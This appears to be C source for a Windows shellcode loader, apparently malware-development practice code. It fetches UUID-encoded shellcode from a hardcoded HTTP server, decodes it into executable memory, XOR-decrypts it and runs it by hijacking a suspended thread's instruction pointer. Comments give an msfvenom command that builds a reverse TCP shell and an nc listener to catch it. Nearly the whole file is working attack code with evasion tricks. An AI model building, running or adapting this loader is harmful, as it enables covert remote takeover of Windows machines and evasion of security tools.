#include <Windows.h>
#include <stdio.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

#define NumberOfElements 32
// Python3 -m http.server 8080
// Have shellreversetcpuuid.txt in the directory
#define PAYLOAD L"http://10.211.55.2:8080/shellreversetcpuuid.txt"

// payload ; msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.16.111 LPORT=4444 -f raw -o reverse.bin
// listner ; nc -nlvp 4444 (on the 192.168.16.111 machine)

// https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-uuidfromstringa
typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(
    RPC_CSTR	StringUuid,
    UUID* Uuid
    );

BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

    PBYTE		pBuffer = NULL,
                TmpBuffer = NULL;

    SIZE_T		sBuffSize = NULL;

    RPC_STATUS 	STATUS = NULL;

    // Getting UuidFromStringA address from Rpcrt4.dll
    fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
    if (pUuidFromStringA == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Getting the real size of the shellcode which is the number of UUID strings * 16
    sBuffSize = NmbrOfElements * 16;

    // Allocating memory which will hold the deobfuscated shellcode
    //pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
    pBuffer = (PBYTE)VirtualAlloc(NULL, sBuffSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pBuffer == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Setting TmpBuffer to be equal to pBuffer
    TmpBuffer = pBuffer;

    // Loop through all the UUID strings saved in UuidArray
    for (int i = 0; i < NmbrOfElements; i++) {

        // Deobfuscating one UUID string at a time
        // UuidArray[i] is a single UUID string from the array UuidArray
        if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
            // if it failed
            printf("[!] UuidFromStringA Failed At [%s] With Error 0x%0.8X", UuidArray[i], STATUS);
            return FALSE;
        }

        // 16 bytes are written to TmpBuffer at a time
        // Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
        TmpBuffer = (PBYTE)(TmpBuffer + 16);

    }

    *ppDAddress = pBuffer;
    *pDSize = sBuffSize;

    return TRUE;
}

BOOL GetUUIDFromUrl(LPCWSTR szUrl, CHAR* UUID[]) {

    BOOL		bSTATE = TRUE;

    HINTERNET	hInternet = NULL,
                hUrl = NULL;

    // Read and store the UUIDs from the URL without null terminators
    char buffer[36]; // Assuming each UUID has 36 characters without a null terminator
    DWORD bytesRead;

    // Opening the internet session handle, all arguments are NULL here since no proxy options are required
    hInternet = InternetOpenW(L"EinAgent", NULL, NULL, NULL, NULL);
    if (hInternet == NULL) {
        printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // Opening the handle to the payload using the payload's URL
    hUrl = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (hUrl == NULL) {
        printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    for (int i = 0; i < NumberOfElements; i++) {
        if (!InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead)) {
            printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
            InternetCloseHandle(hUrl);
            InternetCloseHandle(hInternet);
            return -1;
        }
        // Allocate memory for the UUID and copy the buffer
        UUID[i] = (char*)malloc(bytesRead);
        if (UUID[i] == NULL) {
            perror("Error allocating memory");
            InternetCloseHandle(hUrl);
            InternetCloseHandle(hInternet);
            return -1;
        }
        memcpy(UUID[i], buffer, bytesRead);
    }


_EndOfFunction:
    if (hInternet)
        InternetCloseHandle(hInternet);									// Closing handle 
    if (hUrl)
        InternetCloseHandle(hUrl);										// Closing handle
    if (hInternet)
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	// Closing Wininet connection
    return bSTATE;
}

// change the random bytes
unsigned char randomKey[] = {
0xAA, 0xBB, 0xCC, 0xDD, 0xEE
};

/*
    - pShellcode : Base address of the payload to encrypt
    - sShellcodeSize : The size of the payload
    - bKey : A random array of bytes of specific size
    - sKeySize : The size of the key
*/

VOID XorFunction(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
    for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
        if (j > sKeySize) {
            j = 0;
        }
        pShellcode[i] = pShellcode[i] ^ bKey[j];
    }
}


// dummy function to use for the sacrificial thread
VOID DummyFunction() {

	// stupid code
	int		j		= rand();
	int		i		= j * j;

}



BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
	
	PVOID		pAddress				= NULL;
	DWORD		dwOldProtection			= NULL;

	// .ContextFlags can be CONTEXT_CONTROL or CONTEXT_ALL as well (this will add more information to the context retrieved)
	CONTEXT		ThreadCtx				= { 
								.ContextFlags = CONTEXT_CONTROL 
	};

	// Allocating memory for the payload
	pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL){
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Copying the payload to the allocated memory
	memcpy(pAddress, pPayload, sPayloadSize);

	// Changing the memory protection
	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the original thread context
	if (!GetThreadContext(hThread, &ThreadCtx)){
		printf("[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	// Updating the next instruction pointer to be equal to the payload's address 
	ThreadCtx.Rip = pAddress;


	/*
		- in case of a x64 payload injection : we change the value of `Rip`
		- in case of a x32 payload injection : we change the value of `Eip`
	*/

	// setting the new updated thread context
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	return TRUE;
}


int main() {

	char* UuidArray[NumberOfElements];

    PBYTE	Bytes = NULL;
    SIZE_T	Size = NULL;

	 // Reading the payload 
    if (!GetUUIDFromUrl(PAYLOAD, &UuidArray)) {
        return -1;
    }
	
	// Now UuidArray contains the UUIDs read from the web server

    // You can print them to verify
    for (int i = 0; i < NumberOfElements; i++) {
        printf("UuidArray[%d]: %s\n", i, UuidArray[i]);
    }

    if (!UuidDeobfuscation(UuidArray, NumberOfElements, &Bytes, &Size)) {
        return -1;
    }

	XorFunction(Bytes, Size, randomKey, sizeof(randomKey));

    printf("[i] Bytes : 0x%p \n", Bytes);
    printf("[i] Size  : %ld \n", Size);

	HANDLE		hThread		= NULL;
	DWORD		dwThreadId	= NULL;

	// Creating sacrificial thread in suspended state 
	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE) &DummyFunction, NULL, CREATE_SUSPENDED, &dwThreadId);
	if (hThread == NULL) {
		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[i] Hijacking Thread Of Id : %d ... ", dwThreadId);
	// hijacking the sacrificial thread created
	if (!RunViaClassicThreadHijacking(hThread, Bytes, Size)) {
		return -1;
	}
	printf("[+] DONE \n");

	printf("[#] Press <Enter> To Run The Payload ... ");
	getchar();


	// resuming suspended thread, so that it runs our shellcode
	ResumeThread(hThread);
	
	WaitForSingleObject(hThread, INFINITE);

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}










